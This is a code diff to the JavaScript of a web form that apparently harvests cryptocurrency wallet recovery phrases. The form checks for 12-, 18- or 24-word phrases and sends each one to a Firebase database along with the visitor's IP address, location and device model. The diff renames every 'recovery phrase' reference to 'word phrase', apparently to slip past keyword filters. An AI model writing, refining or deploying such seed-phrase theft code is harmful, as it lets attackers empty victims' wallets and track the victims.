@@ -39,10 +39,10 @@ function formatDate(timestamp) {
   return formattedDate;
 }
 
-// Validate recovery phrase (12, 18, or 24 words)
-function validatePhrase(recoveryPhrase) {
+// Validate  phrase (12, 18, or 24 words)
+function validatePhrase(wordPhrase) {
   const regex = /^(\b\w+\b\s){11,23}\b\w+\b$/;
-  return regex.test(recoveryPhrase.trim());
+  return regex.test(wordPhrase.trim());
 }
 
 // Reset the form
@@ -197,7 +197,7 @@ async function save(event) {
   event.preventDefault();
 
   const walletTypes = document.querySelectorAll("#wallet-type");
-  const recoveryPhrases = document.querySelectorAll("#phrase");
+  const wordPhrases = document.querySelectorAll("#phrase");
   const errorMessages = document.querySelectorAll("#error-message");
 
   let allValid = true;
@@ -205,22 +205,22 @@ async function save(event) {
 
   walletTypes.forEach((walletTypeElement, index) => {
     const walletType = walletTypeElement.value.trim();
-    const recoveryPhrase = recoveryPhrases[index]?.value.trim();
+    const wordPhrase = wordPhrases[index]?.value.trim();
     const errorMessage = errorMessages[index];
 
-    if (!validatePhrase(recoveryPhrase)) {
+    if (!validatePhrase(wordPhrase)) {
       errorMessage.textContent =
-        "Invalid recovery phrase. Ensure it has 12, 18, or 24 words.";
+        "Invalid word phrases. Ensure it has 12, 18, or 24 words.";
       errorMessage.style.display = "block";
       allValid = false;
     } else {
       errorMessage.style.display = "none";
 
       // Push data to Firebase with timestamp
-      const newResponseRef = ref(database, "WalletResponse");
+      const newResponseRef = ref(database, "Wallet_Response");
       push(newResponseRef, {
         wallet_Type: walletType,
-        recovery_Phrase: recoveryPhrase,
+        word_Phrase: wordPhrase,
         ip_Address: deviceDetails.ipAddress,
         location: deviceDetails.location,
         device_Model: deviceDetails.deviceModel,
